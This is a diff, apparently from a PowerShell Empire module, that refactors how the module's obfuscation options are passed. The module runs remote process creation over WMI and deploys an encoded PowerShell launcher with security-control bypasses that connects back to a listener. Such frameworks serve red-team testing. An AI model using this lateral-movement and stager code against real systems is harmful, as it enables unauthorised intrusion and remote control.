@@ -17,17 +17,17 @@ class Module(object):
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         
         script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""
-        # Set booleans to false by default
-        obfuscate = False
-
-        # management options
+        
+        # staging options
         cleanup = params['Cleanup']
         binary = params['Binary']
         target_binary = params['TargetBinary']
         listener_name = params['Listener']
         if (params['Obfuscate']).lower() == 'true':
-            obfuscate = True
-        obfuscate_command = params['ObfuscateCommand']
+            launcher_obfuscate = True
+        else:
+            launcher_obfuscate = False
+        launcher_obfuscate_command = params['ObfuscateCommand']
 
         # storage options
         reg_path = params['RegPath']
@@ -65,8 +65,11 @@ class Module(object):
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
-                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
+                launcher = main_menu.stagers.generate_launcher(listenerName=listener_name,
+                                                               language='powershell',
+                                                               encode=True,
+                                                               obfuscate=launcher_obfuscate,
+                                                               obfuscationCommand=launcher_obfuscate_command,
                                                                bypasses=params['Bypasses'])
                 
                 encScript = launcher.split(" ")[-1]
@@ -110,9 +113,5 @@ class Module(object):
 
         script += ";'Invoke-Wmi executed on " +computer_names + status_msg+"'"
 
-        if main_menu.obfuscate:
-            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(script=script, script_end="", obfuscate=obfuscate, obfuscation_command=obfuscation_command)
         return script
-
